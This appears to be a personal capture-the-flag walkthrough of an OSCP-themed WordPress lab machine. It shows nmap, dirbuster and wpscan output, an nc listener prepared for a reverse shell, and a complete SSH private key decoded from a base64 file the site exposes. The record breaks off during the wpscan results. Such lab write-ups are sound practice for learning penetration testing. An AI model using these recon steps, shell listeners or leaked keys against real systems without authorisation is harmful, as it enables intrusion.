#Prep

set up nc -nlvp 4444

  

#Enumeration

Assume netdiscover + subnet ping scan

Target: 192.168.204.89

  

##Nmap

 →  nmap -p- -sV -sC --open -T4 192.168.204.89 -oN InfoSecPrep_nmap.txt                                    15:19:09

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 15:19 GMT

Nmap scan report for 192.168.195.89

Host is up (0.046s latency).

Not shown: 64339 closed tcp ports (conn-refused), 1193 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT      STATE SERVICE VERSION

22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   3072 91ba0dd43905e31355578f1b4690dbe4 (RSA)

|   256 0f35d1a131f2f6aa75e81701e71ed1d5 (ECDSA)

|_  256 aff153ea7b4dd7fad8de0df228fc86d7 (ED25519)

80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-server-header: Apache/2.4.41 (Ubuntu)

|_http-generator: WordPress 5.4.2

| http-robots.txt: 1 disallowed entry 

|_/secret.txt

|_http-title: OSCP Voucher &#8211; Just another WordPress site

33060/tcp open  mysqlx?

| fingerprint-strings: 

|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 

|     Invalid message"

|_    HY000

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port33060-TCP:V=7.93%I=7%D=6/21%Time=6493151F%P=x86_64-pc-linux-gnu%r(N

SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\

SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp

SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b

SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers

SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2

SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI

SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")

SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01

SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie

SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x

SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"

SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9

SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\

SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0

SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,

SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0

SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\

SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions

SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x

SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"

SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1

SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000

SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0

SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r

SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0

SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\

SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 43.79 seconds

  

/secret.txt found

  

##Website

Ah the site finally loaded after the OSCP labs stopped crashing. It's a wordpress site about the OSCP

  

[http://192.168.204.89/secret.txt](http://192.168.204.89/secret.txt)

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB

QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB

d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3

K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ

ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV

UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx

MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY

S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0

eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ

aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj

MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy

aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS

d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0

SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw

NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ

ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1

R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ

THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT

WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC

M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu

dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np

c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i

VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB

cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq

NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz

NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG

cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl

MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r

bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK

eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r

TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP

cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV

blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y

CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB

SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H

bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK

TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp

a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK

T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx

djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS

aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0

RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy

ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr

dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh

bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg

T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==

Base64 found.  Converts to an SSH private Key

  

-----BEGIN OPENSSH PRIVATE KEY-----

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

8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=

-----END OPENSSH PRIVATE KEY-----

  

Now to find a user

  

...Reading the site reveals the user is "oscp"

  

##Dirbuster

 →  dirbuster                                                                                              15:31:31

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

Starting OWASP DirBuster 1.0-RC1

Starting dir/file list based brute forcing

Dir found: / - 200

Dir found: /index.php/sample-page/ - 200

Dir found: /index.php/2020/ - 200

Dir found: /index.php/2020/07/ - 200

File found: /index.php/index.php - 200

Dir found: /index.php/2020/07/09/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/ - 200

Dir found: /index.php/sample-page/2006/ - 200

Dir found: /index.php/author/admin/ - 200

Dir found: /index.php/sample-page/12/ - 200

Dir found: /index.php/2020/07/09/hello-world/ - 200

File found: /wp-login.php - 200

Dir found: /index.php/feed/ - 200

Dir found: /index.php/sample-page/11/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/2006/ - 200

Dir found: /index.php/sample-page/10/ - 200

Dir found: /index.php/comments/feed/ - 200

Dir found: /wp-content/ - 200

Dir found: /wp-content/themes/ - 200

Dir found: /index.php/sample-page/2005/ - 200

Dir found: /wp-includes/ - 200

Dir found: /index.php/2020/07/09/hello-world/2006/ - 200

File found: /wp-content/themes/index.php - 200

Dir found: /index.php/2020/07/09/oscp-voucher/12/ - 200

Dir found: /wp-content/themes/twentytwenty/assets/ - 200

File found: /wp-content/index.php - 200

Dir found: /wp-includes/images/ - 200

Dir found: /index.php/2020/07/09/hello-world/12/ - 200

Dir found: /wp-content/themes/twentytwenty/assets/js/ - 200

Dir found: /wp-includes/js/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/11/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/10/ - 200

Dir found: /index.php/2020/07/09/hello-world/11/ - 200

Dir found: /index.php/sample-page/2/ - 200

Dir found: /wp-content/themes/twentytwenty/assets/css/ - 200

Dir found: /index.php/2020/07/09/hello-world/10/ - 200

Dir found: /wp-content/themes/twentytwenty/assets/images/ - 200

File found: /wp-content/themes/twentytwenty/assets/js/index.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/2005/ - 200

Dir found: /wp-includes/js/jquery/ - 200

File found: /wp-includes/js/wp-embed.min.js - 200

File found: /wp-content/themes/twentytwenty/assets/css/editor-style-block-rtl.css - 200

Dir found: /index.php/2020/07/09/hello-world/2005/ - 200

Dir found: /wp-includes/images/crystal/ - 200

File found: /wp-content/themes/twentytwenty/assets/js/color-calculations.js - 200

Dir found: /wp-content/themes/twentytwenty/assets/fonts/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/2/ - 200

Dir found: /wp-content/themes/twentytwenty/assets/fonts/inter/ - 200

Dir found: /index.php/2020/07/09/hello-world/2/ - 200

File found: /wp-includes/images/crystal/license.txt - 200

Dir found: /wp-includes/images/media/ - 200

File found: /wp-content/themes/twentytwenty/assets/js/customize-controls.js - 200

Dir found: /index.php/sample-page/3/ - 200

Dir found: /index.php/sample-page/13/ - 200

Dir found: /index.php/sample-page/14/ - 200

Dir found: /index.php/sample-page/4/ - 200

File found: /wp-content/themes/twentytwenty/assets/css/editor-style-block.css - 200

File found: /wp-includes/js/jquery/jquery-migrate.js - 200

Dir found: /index.php/sample-page/15/ - 200

Dir found: /index.php/2020/07/09/hello-world/3/ - 200

File found: /wp-includes/js/jquery/jquery.js - 200

Dir found: /index.php/2020/07/09/hello-world/13/ - 200

Dir found: /index.php/2020/07/09/hello-world/4/ - 200

File found: /wp-includes/js/jquery/jquery-migrate.min.js - 200

Dir found: /index.php/sample-page/16/ - 200

Dir found: /index.php/2020/07/09/hello-world/14/ - 200

File found: /wp-content/themes/twentytwenty/assets/css/editor-style-classic-rtl.css - 200

Dir found: /index.php/sample-page/2004/ - 200

Dir found: /index.php/sample-page/18/ - 200

File found: /wp-content/themes/twentytwenty/assets/fonts/inter/Inter-italic-var.woff2 - 200

File found: /wp-content/themes/twentytwenty/assets/js/customize-preview.js - 200

Dir found: /wp-includes/images/smilies/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/3/ - 200

Dir found: /index.php/2020/07/09/hello-world/15/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/13/ - 200

Dir found: /index.php/2020/07/09/hello-world/16/ - 200

Dir found: /index.php/2020/07/09/hello-world/2004/ - 200

Dir found: /index.php/2020/07/09/hello-world/18/ - 200

File found: /wp-content/themes/twentytwenty/assets/js/customize.js - 200

Dir found: /wp-includes/images/wlw/ - 200

File found: /wp-content/themes/twentytwenty/assets/fonts/inter/Inter-upright-var.woff2 - 200

Dir found: /index.php/2020/07/09/oscp-voucher/4/ - 200

Dir found: /index.php/sample-page/21/ - 200

Dir found: /index.php/sample-page/20/ - 200

Dir found: /index.php/2020/07/09/hello-world/22/ - 200

Dir found: /index.php/2020/07/09/hello-world/20/ - 200

Dir found: /index.php/2020/07/09/hello-world/21/ - 200

Dir found: /index.php/2020/07/09/hello-world/5/ - 200

Dir found: /index.php/2020/07/09/hello-world/6/ - 200

File found: /wp-content/themes/twentytwenty/assets/css/editor-style-classic.css - 200

File found: /wp-includes/js/jquery/jquery.color.min.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/14/ - 200

Dir found: /index.php/2020/07/09/hello-world/19/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/15/ - 200

File found: /wp-includes/js/zxcvbn-async.min.js - 200

Dir found: /wp-content/themes/twentytwenty/templates/ - 200

Dir found: /index.php/sample-page/5/ - 200

Dir found: /index.php/sample-page/22/ - 200

File found: /wp-includes/js/jquery/jquery.form.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/16/ - 200

Dir found: /index.php/sample-page/6/ - 200

Dir found: /index.php/2020/07/09/hello-world/24/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/18/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/2004/ - 200

Dir found: /index.php/sample-page/19/ - 200

File found: /wp-includes/category.php - 200

File found: /wp-content/themes/twentytwenty/assets/js/editor-script-block.js - 200

Dir found: /index.php/2020/07/09/hello-world/2007/ - 200

Dir found: /index.php/2020/07/09/hello-world/23/ - 200

Dir found: /index.php/0/ - 200

Dir found: /index.php/2020/07/09/feed/ - 200

Dir found: /index.php/sample-page/24/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/20/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/5/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/21/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/22/ - 200

File found: /wp-content/themes/twentytwenty/assets/js/skip-link-focus-fix.js - 200

Dir found: /index.php/2020/07/09/hello-world/17/ - 200

Dir found: /index.php/2020/07/09/hello-world/26/ - 200

Dir found: /index.php/2020/07/09/hello-world/27/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/6/ - 200

Dir found: /index.php/2020/07/09/hello-world/9/ - 200

Dir found: /index.php/2020/7/ - 200

Dir found: /index.php/sample-page/2007/ - 200

Dir found: /index.php/2020/07/09/hello-world/30/ - 200

File found: /wp-includes/js/jquery/jquery.form.min.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/19/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/24/ - 200

Dir found: /index.php/sample-page/23/ - 200

Dir found: /index.php/sample-page/17/ - 200

Dir found: /index.php/sample-page/26/ - 200

Dir found: /index.php/2020/07/9/ - 200

Dir found: /index.php/sample-page/27/ - 200

Dir found: /index.php/2020/0/ - 200

Dir found: /index.php/sample-page/30/ - 200

Dir found: /index.php/sample-page/9/ - 200

File found: /wp-includes/js/jquery/jquery.hotkeys.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/2007/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/23/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/17/ - 200

Dir found: /index.php/2020/07/09/hello-world/29/ - 200

Dir found: /index.php/2020/feed/ - 200

Dir found: /index.php/sample-page/29/ - 200

Dir found: /index.php/sample-page/28/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/27/ - 200

Dir found: /index.php/2020/07/09/hello-world/28/ - 200

Dir found: /index.php/sample-page/7/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/26/ - 200

Dir found: /index.php/2020/07/09/hello-world/7/ - 200

Dir found: /index.php/2020/07/09/hello-world/0/ - 200

Dir found: /index.php/2020/07/09/hello-world/25/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/9/ - 200

Dir found: /index.php/2020/07/09/hello-world/feed/ - 200

Dir found: /index.php/sample-page/25/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/30/ - 200

Dir found: /index.php/sample-page/0/ - 200

File found: /wp-includes/js/jquery/jquery.hotkeys.min.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/29/ - 200

Dir found: /index.php/2020/07/feed/ - 200

Dir found: /index.php/2020/07/0/ - 200

Dir found: /index.php/sample-page/10/feed/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/28/ - 200

Dir found: /wp-admin/js/ - 200

Dir found: /index.php/sample-page/feed/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/7/ - 200

Dir found: /wp-admin/images/ - 200

File found: /wp-includes/js/jquery/jquery.masonry.min.js - 200

Dir found: /index.php/sample-page/8/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/25/ - 200

Dir found: /index.php/sample-page/11/feed/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/0/ - 200

Dir found: /index.php/2020/07/09/hello-world/8/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/feed/ - 200

Dir found: /index.php/author/admin/feed/ - 200

File found: /wp-includes/js/jquery/jquery.query.js - 200

File found: /wp-admin/js/password-strength-meter.min.js - 200

Dir found: /index.php/sample-page/2005/feed/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/8/ - 200

File found: /wp-includes/js/jquery/jquery.schedule.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/2006/feed/ - 200

Dir found: /index.php/2020/7/09/ - 200

File found: /wp-includes/js/underscore.min.js - 200

File found: /wp-includes/js/jquery/jquery.serialize-object.js - 200

Dir found: /index.php/sample-page/2003/ - 200

File found: /wp-includes/js/jquery/jquery.table-hotkeys.js - 200

File found: /wp-includes/js/wp-util.min.js - 200

Dir found: /index.php/2020/07/09/oscp-voucher/12/feed/ - 200

File found: /wp-includes/js/jquery/jquery.table-hotkeys.min.js - 200

File found: /wp-admin/js/user-profile.min.js - 200

Dir found: /index.php/2020/07/09/hello-world/12/feed/ - 200

Dir found: /index.php/sample-page/2006/feed/ - 200

Dir found: /index.php/2020/07/09/hello-world/2003/ - 200

File found: /wp-includes/js/jquery/jquery.ui.touch-punch.js - 200

File found: /wp-includes/js/jquery/suggest.js - 200

Dir found: /index.php/sample-page/12/feed/ - 200

Dir found: /index.php/sample-page/09/feed/ - 200

File found: /wp-includes/js/jquery/suggest.min.js - 200

Dir found: /wp-includes/js/jquery/ui/ - 200

Dir found: /index.php/2020/07/09/hello-world/2006/feed/ - 200

Dir found: /index.php/2020/07/09/hello-world/1/feed/ - 200

Dir found: /index.php/2020/07/09/oscp-voucher/2003/ - 200

Dir found: /index.php/2020/07/09/hello-world/10/feed/ - 200

Dir found: /index.php/sample-page/1/feed/ - 200

File found: /wp-includes/user.php - 200

  

TMI since it's a WP site. This is what wpscan is for.

  

Had to grep out the results with grep -e "- 200"

  

##wpscan

  

Remember the --enumerate flag is SUPER important!

  

 →  wpscan --url http://192.168.204.89 --enumerate                                  15:40:06

_______________________________________________________________

         __          _______   _____

         \ \        / /  __ \ / ____|

          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®

           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \

            \  /\  /  | |     ____) | (__| (_| | | | |

             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

  

         WordPress Security Scanner by the WPScan Team

                         Version 3.8.22

       Sponsored by Automattic - https://automattic.com/

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

_______________________________________________________________

  

[+] URL: http://192.168.204.89/ [192.168.204.89]

[+] Started: Wed Jun 21 15:40:16 2023

  

Interesting Finding(s):

  

[+] Headers

 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)

 | Found By: Headers (Passive Detection)

 | Confidence: 100%

  

[+] robots.txt found: http://192.168.204.89/robots.txt

 | Found By: Robots Txt (Aggressive Detection)

 | Confidence: 100%

  

[+] XML-RPC seems to be enabled: http://192.168.204.89/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

 | References:

 |  - http://codex.wordpress.org/XML-RPC_Pingback_API

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/

 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/

